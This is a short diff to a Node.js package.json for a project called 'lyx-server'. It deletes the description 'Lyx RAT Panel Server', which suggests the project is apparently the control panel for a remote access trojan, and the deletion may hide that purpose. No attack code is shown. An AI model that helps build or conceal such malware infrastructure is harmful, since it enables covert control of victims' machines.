@@ -1,7 +1,6 @@
 {
   "name": "lyx-server",
   "version": "1.0.0",
-  "description": "Lyx RAT Panel Server",
   "main": "server.js",
   "scripts": {
     "start": "node server.js"
